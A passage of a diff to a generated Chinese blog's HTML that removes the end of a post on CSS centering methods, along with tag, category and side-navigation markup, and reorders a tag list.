-<h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">text-align: center;</span><br><span class="line">margin</span><br><span class="line">padding</span><br><span class="line">line-height</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.jianshu.com/p/868389ddf199" target="_blank" rel="noopener">实现垂直水平居中的几种方法</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">前端</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">html</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/blog/categories/前端//" class="article-tag-list-link color3">前端</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/blog/2018/02/05/HTML学习笔记(4)-水平垂直居中的几种方法/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/blog/page/2/">2</a><a class="extend next" rel="next" href="/blog/page/2/">Next &raquo;</a>
@@ -1491,19 +1576,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">前端</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">html</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">爬虫</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
